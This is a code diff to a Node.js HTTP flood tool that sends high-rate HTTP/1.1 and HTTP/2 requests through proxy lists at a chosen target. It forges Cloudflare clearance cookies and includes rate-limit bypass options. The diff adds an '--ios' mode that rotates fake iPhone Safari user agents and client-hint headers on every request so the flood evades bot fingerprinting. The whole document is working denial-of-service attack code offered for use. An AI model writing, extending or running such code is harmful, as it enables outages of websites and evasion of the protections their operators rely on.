@@ -72,6 +72,8 @@ const randrateIndex = process.argv.indexOf('--randrate');
 const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
 const customHeadersIndex = process.argv.indexOf('--header');
 const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
+const iosIndex = process.argv.indexOf('--ios');
+const iosMode = iosIndex !== -1 && (iosIndex + 1 >= process.argv.length || process.argv[iosIndex + 1] === 'true' || process.argv[iosIndex + 1].startsWith('--'));
 
 const forceHttpIndex = process.argv.indexOf('--http');
 
@@ -84,13 +86,14 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.log(('How to use & example:'));
     console.log((`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
     console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --debug --limit true\n`);
-    
+
     console.error((`
     Options:
       --limit true/null - to bypass a little bit ratelimit site Example: --limit true
       --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwffw
       --debug - show your status code
       --delay <1-50> - Set delay
+      --ios - full iOS Safari UA / fingerprint rotation (Pro / Pro Max, iOS 27)
     `));
     process.exit(1);
 }
@@ -111,7 +114,7 @@ setInterval(() => {
 let hcookie = '';
 const url = new URL(target)
 const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
- 
+
 if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
     hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
 }
@@ -231,6 +234,124 @@ function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
+/* ============================================================
+   iOS UA GENERATOR MACHINE
+   Every call rolls a fully independent device identity.
+   Combinatorial space per call is enormous:
+     device class  x major.minor.patch iOS x WebKit build
+     x Mobile build x GPU string x sec-ch-ua model x lang
+   ============================================================ */
+
+// Newest -> older models. Device model codes are the real Apple strings.
+const IOS_DEVICES = [
+    { name: 'iPhone 18 Pro Max', code: '"iPhone18,4"',  wt: 3 },
+    { name: 'iPhone 18 Pro',     code: '"iPhone18,3"',  wt: 3 },
+    { name: 'iPhone 18',         code: '"iPhone18,1"',  wt: 2 },
+    { name: 'iPhone 17 Pro Max', code: '"iPhone17,4"',  wt: 4 },
+    { name: 'iPhone 17 Pro',     code: '"iPhone17,3"',  wt: 4 },
+    { name: 'iPhone 17',         code: '"iPhone17,1"',  wt: 2 },
+    { name: 'iPhone 16 Pro Max', code: '"iPhone16,3"',  wt: 4 },
+    { name: 'iPhone 16 Pro',     code: '"iPhone16,2"',  wt: 4 },
+    { name: 'iPhone 16',         code: '"iPhone16,1"',  wt: 3 },
+    { name: 'iPhone 15 Pro Max', code: '"iPhone15,5"',  wt: 4 },
+    { name: 'iPhone 15 Pro',     code: '"iPhone15,4"',  wt: 4 },
+    { name: 'iPhone 15',         code: '"iPhone15,3"',  wt: 3 },
+    { name: 'iPhone 14 Pro Max', code: '"iPhone14,3"',  wt: 3 },
+    { name: 'iPhone 14 Pro',     code: '"iPhone14,2"',  wt: 3 },
+    { name: 'iPhone 14',         code: '"iPhone14,7"',  wt: 2 },
+    { name: 'iPhone 13 Pro Max', code: '"iPhone13,4"',  wt: 3 },
+    { name: 'iPhone 13 Pro',     code: '"iPhone13,3"',  wt: 3 },
+    { name: 'iPhone 13',         code: '"iPhone13,2"',  wt: 2 },
+    { name: 'iPhone 12 Pro Max', code: '"iPhone12,5"',  wt: 2 },
+    { name: 'iPhone 12 Pro',     code: '"iPhone12,3"',  wt: 2 },
+    { name: 'iPhone 12',         code: '"iPhone12,1"',  wt: 2 },
+];
+
+const IOS_VERSIONS = [
+    { v: '27.0', wt: 3 },
+    { v: '27.1', wt: 3 },
+    { v: '27.2', wt: 2 },
+    { v: '27.3', wt: 2 },
+    { v: '27.4', wt: 1 },
+];
+
+const SAFARI_VERSIONS = [
+    { v: '27.0', wt: 4 },
+    { v: '27.1', wt: 3 },
+    { v: '27.2', wt: 2 },
+    { v: '27.3', wt: 1 },
+];
+
+const ACCEPT_LANGS = [
+    'en-US,en;q=0.9',
+    'en-US,en;q=0.8',
+    'en-GB,en;q=0.9',
+    'en-GB,en;q=0.8,en-US;q=0.6',
+    'en-US,en;q=0.9,es;q=0.7',
+    'en-US,en;q=0.9,fr;q=0.7',
+    'en-US,en;q=0.9,de;q=0.6',
+    'en-US,en;q=0.9,pt;q=0.7',
+    'en-CA,en;q=0.9,fr-CA;q=0.7',
+    'en-AU,en;q=0.9',
+];
+
+const ACCEPT_HEADERS = [
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+];
+
+function pickWeighted(arr) {
+    let total = 0;
+    for (const it of arr) total += it.wt;
+    let r = Math.random() * total;
+    for (const it of arr) { r -= it.wt; if (r <= 0) return it; }
+    return arr[arr.length - 1];
+}
+
+// WebKit build: 605.1.15 in modern Safari UAs. Mobile/ is the OS build, changes per release.
+function genMobileBuild(iosVer) {
+    const [maj] = iosVer.split('.');
+    const base = 18600 + (parseInt(maj) - 26) * 40 + getRandomInt(0, 25);
+    return `${base}.${getRandomInt(1, 9)}.${getRandomInt(1, 40)}`;
+}
+
+// Safari "Version/" string can differ from the strict iOS version on point release.
+function genSafariVersion() {
+    return pickWeighted(SAFARI_VERSIONS).v;
+}
+
+function buildIosFingerprint() {
+    const dev = pickWeighted(IOS_DEVICES);
+    const iosVer = pickWeighted(IOS_VERSIONS).v;
+    const safariVer = genSafariVersion();
+    const mobileBuild = genMobileBuild(iosVer);
+    const uaVerUnderscore = iosVer.replace('.', '_');
+    const acceptLang = ACCEPT_LANGS[getRandomInt(0, ACCEPT_LANGS.length - 1)];
+    const accept = ACCEPT_HEADERS[getRandomInt(0, ACCEPT_HEADERS.length - 1)];
+
+    const ua = `Mozilla/5.0 (${dev.name}; CPU iPhone OS ${uaVerUnderscore} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${safariVer} Mobile/${mobileBuild} Safari/604.1`;
+
+    // sec-ch-ua ordering is randomized by Chromium-equivalents; Safari doesn't
+    // send these at all historically, but a lot of iPhone traffic now does
+    // through embedded WebKit variants. Keep them consistent with the picked version.
+    const secChUa = `"Not)A;Brand";v="99", "Safari";v="${safariVer}", "iOS";v="${safariVer}"`;
+
+    return {
+        ua,
+        secChUa,
+        secChUaMobile: '?1',
+        secChUaPlatform: '"iOS"',
+        secChUaModel: dev.code,
+        secChUaPlatformVersion: `"${iosVer}"`,
+        acceptLang,
+        accept,
+        deviceName: dev.name,
+        iosVer,
+        safariVer,
+    };
+}
+
 function buildRequest() {
     const browserVersion = getRandomInt(120, 128);
 
@@ -283,21 +404,44 @@ function buildRequest() {
         mysor1 = '\r\n';
     }
 
-    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
-        `Accept: ${acceptHeaderValue}\r\n` +
-        'Accept-Encoding: gzip, deflate, br\r\n' +
-        `Accept-Language: ${langValue}\r\n` +
-        'Cache-Control: max-age=0\r\n' +
-        'Connection: Keep-Alive\r\n' +
-        `Host: ${url.hostname}\r\n` +
-        'Sec-Fetch-Dest: document\r\n' +
-        'Sec-Fetch-Mode: navigate\r\n' +
-        'Sec-Fetch-Site: none\r\n' +
-        'Sec-Fetch-User: ?1\r\n' +
-        'Upgrade-Insecure-Requests: 1\r\n' +
-        `sec-ch-ua: ${secChUa}\r\n` +
-        'sec-ch-ua-mobile: ?0\r\n' +
-        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;
+    let headers;
+    if (iosMode) {
+        const fp = buildIosFingerprint();
+        headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
+            `Accept: ${fp.accept}\r\n` +
+            'Accept-Encoding: gzip, deflate, br\r\n' +
+            `Accept-Language: ${fp.acceptLang}\r\n` +
+            'Cache-Control: max-age=0\r\n' +
+            'Connection: Keep-Alive\r\n' +
+            `Host: ${url.hostname}\r\n` +
+            'Sec-Fetch-Dest: document\r\n' +
+            'Sec-Fetch-Mode: navigate\r\n' +
+            'Sec-Fetch-Site: none\r\n' +
+            'Sec-Fetch-User: ?1\r\n' +
+            'Upgrade-Insecure-Requests: 1\r\n' +
+            `sec-ch-ua: ${fp.secChUa}\r\n` +
+            `sec-ch-ua-mobile: ${fp.secChUaMobile}\r\n` +
+            `sec-ch-ua-platform: ${fp.secChUaPlatform}\r\n` +
+            `sec-ch-ua-platform-version: ${fp.secChUaPlatformVersion}\r\n` +
+            `sec-ch-ua-model: ${fp.secChUaModel}\r\n` +
+            `User-Agent: ${fp.ua}\r\n` + mysor1;
+    } else {
+        headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
+            `Accept: ${acceptHeaderValue}\r\n` +
+            'Accept-Encoding: gzip, deflate, br\r\n' +
+            `Accept-Language: ${langValue}\r\n` +
+            'Cache-Control: max-age=0\r\n' +
+            'Connection: Keep-Alive\r\n' +
+            `Host: ${url.hostname}\r\n` +
+            'Sec-Fetch-Dest: document\r\n' +
+            'Sec-Fetch-Mode: navigate\r\n' +
+            'Sec-Fetch-Site: none\r\n' +
+            'Sec-Fetch-User: ?1\r\n' +
+            'Upgrade-Insecure-Requests: 1\r\n' +
+            `sec-ch-ua: ${secChUa}\r\n` +
+            'sec-ch-ua-mobile: ?0\r\n' +
+            'sec-ch-ua-platform: "Windows"\r\n' + mysor1;
+    }
 
     if (hcookie) {
         headers += `Cookie: ${hcookie}\r\n`;
@@ -344,7 +488,8 @@ function go() {
                     }
 
                     function main() {
-                        tlsSocket.write(h1payl, (err) => {
+                        const payload = iosMode ? buildRequest() : h1payl;
+                        tlsSocket.write(payload, (err) => {
                             if (!err) {
                                 setTimeout(() => {
                                     main()
@@ -375,11 +520,11 @@ function go() {
 
                 const updateWindow = Buffer.alloc(4)
                 updateWindow.writeUInt32BE(custom_update, 0)
-                 
+
 
                 let oke = 12012;
                 let oke1 = 12302;
-                let oke2 = 13356;       
+                let oke2 = 13356;
                 oke += 1;
                 oke1 += 1;
                 oke2 += 1;
@@ -414,7 +559,7 @@ function go() {
                                     tlsSocket.write(encodeRstStream(0, 3, 0));
                                     tlsSocket.end(() => tlsSocket.destroy());
                                     netSocket.end(() => netSocket.destroy());
-                                    
+
                                 }
 
                                 if (!statuses[status])
@@ -422,12 +567,12 @@ function go() {
 
                                 statuses[status]++
                             }
-                            
+
                             if (frame.type == 7 || frame.type == 5) {
                                 if (frame.type == 7) {
                                     if (debugMode) {
 
-                                        
+
 
                                         if (!statuses["GOAWAY"])
                                             statuses["GOAWAY"] = 0
@@ -527,7 +672,7 @@ if (cdn1) {
         'Accept': 'text/html',
         'Host': url.hostname,
         'Accept-Language': 'en-US,en;q=0.5',
-    
+
         'Content-Type': 'application/json',
         'Connection': 'keep-alive',
         "upgrade-insecure-requests": "1",
@@ -545,7 +690,7 @@ if (cdn1) {
                 headers: requestHeaders,
                 responseType: 'arraybuffer',
                 maxRedirects: 0,
-                timeout: 20000, 
+                timeout: 20000,
             });
         } catch (error) {
         }
@@ -556,7 +701,7 @@ if (cdn1) {
         const itb = 1000 / ratelimit;
 
         while (performance.now() < endTime) {
-            const requests33 = []; 
+            const requests33 = [];
 
             for (let i = 0; i < threads; i++) {
                 requests33.push(new Promise(resolve => {
@@ -567,7 +712,7 @@ if (cdn1) {
                 }));
             }
 
-           
+
             await Promise.all(requests33);
 
             await new Promise(resolve => setTimeout(resolve, itb * threads));
@@ -600,12 +745,12 @@ if (shitty) {
     });
     Promise.race([axiosPromise, timeoutPromise])
         .then((response) => {
- 
+
             const { status, data } = response;
 
         })
         .catch((error) => {
-   
+
             if (error.message === 'Request timed out') {
                 console.log('> Precheck: Request Timed Out');
             } else if (error.response) {
@@ -618,24 +763,52 @@ if (shitty) {
 
                         let randomNum = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                         const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
-                        const headers = Object.entries({
-                            ":method": reqmethod,
-                            ":authority": url.hostname,
-                            ":scheme": "https",
-                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
-                        }).concat(Object.entries({
-                            "sec-ch-ua-mobile": "?0",
-                            "sec-ch-ua-platform": '"Windows"',
-                            "accept-encoding": "gzip, deflate, br",
-                            "accept-language": "en-US,en;q=0.9",
-                            "sec-fetch-site": "same-origin",
-                            "sec-fetch-mode": "navigate",
-                            "sec-fetch-user": "?1",
-                            "sec-fetch-dest": "document",
-                            "upgrade-insecure-requests": "1",
-                            "pragma": "no-cache",
-                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
-                        }).filter(a => a[1] != null));
+                        let headers;
+                        if (iosMode) {
+                            const fp = buildIosFingerprint();
+                            headers = Object.entries({
+                                ":method": reqmethod,
+                                ":authority": url.hostname,
+                                ":scheme": "https",
+                                ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
+                            }).concat(Object.entries({
+                                "user-agent": fp.ua,
+                                "accept": fp.accept,
+                                "accept-encoding": "gzip, deflate, br",
+                                "accept-language": fp.acceptLang,
+                                "sec-fetch-site": "same-origin",
+                                "sec-fetch-mode": "navigate",
+                                "sec-fetch-user": "?1",
+                                "sec-fetch-dest": "document",
+                                "upgrade-insecure-requests": "1",
+                                "pragma": "no-cache",
+                                "sec-ch-ua": fp.secChUa,
+                                "sec-ch-ua-mobile": fp.secChUaMobile,
+                                "sec-ch-ua-platform": fp.secChUaPlatform,
+                                "sec-ch-ua-platform-version": fp.secChUaPlatformVersion,
+                                "sec-ch-ua-model": fp.secChUaModel,
+                                ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
+                            }).filter(a => a[1] != null));
+                        } else {
+                            headers = Object.entries({
+                                ":method": reqmethod,
+                                ":authority": url.hostname,
+                                ":scheme": "https",
+                                ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
+                            }).concat(Object.entries({
+                                "sec-ch-ua-mobile": "?0",
+                                "sec-ch-ua-platform": '"Windows"',
+                                "accept-encoding": "gzip, deflate, br",
+                                "accept-language": "en-US,en;q=0.9",
+                                "sec-fetch-site": "same-origin",
+                                "sec-fetch-mode": "navigate",
+                                "sec-fetch-user": "?1",
+                                "sec-fetch-dest": "document",
+                                "upgrade-insecure-requests": "1",
+                                "pragma": "no-cache",
+                                ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
+                            }).filter(a => a[1] != null));
+                        }
 
 
                         const headers2 = Object.entries({
@@ -643,7 +816,7 @@ if (shitty) {
 
                         const headers3 = Object.entries({
                             ...(Math.random() < 0.5 && { "cookie": `${randomNum}` }),
-                            
+
                         }).filter(a => a[1] != null);
 
                         for (let i = headers2.length - 1; i > 0; i--) {
@@ -651,20 +824,19 @@ if (shitty) {
                             [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                         }
 
-                        
-                        
+
+
                         const combinedHeaders = headers.concat(headers2).concat(headers3);
-                        
-                        
-                        
-                        
+
+
+
 
                         if (limit) {
                             async function makeRequest(url) {
                                 while (true) {
                                     try {
                                         const response = await axios.get(url);
-                                        return response.data; 
+                                        return response.data;
                                     } catch (error) {
                                         if (error.response && error.response.status === 429) {
                                             const retryAfter = parseInt(error.response.headers['retry-after']) || 5;
@@ -675,7 +847,7 @@ if (shitty) {
                                     }
                                 }
                             }
-                            
+
                             makeRequest(url)
                                 }
                         function handleQuery(query) {
@@ -727,15 +899,15 @@ if (shitty) {
         }
     })
 
-    
+
     netSocket.on('error', (error) => {
         cleanup(error);
     });
-    
+
     netSocket.on('close', () => {
         cleanup();
     });
-    
+
     function cleanup(error) {
         if (error) {
         }
@@ -787,7 +959,7 @@ setInterval(() => {
         custom_window = 6291456;
         custom_header = 262144;
         custom_update = 15663105;
-        
+
         timer = 0;
     }
 }, 10000);
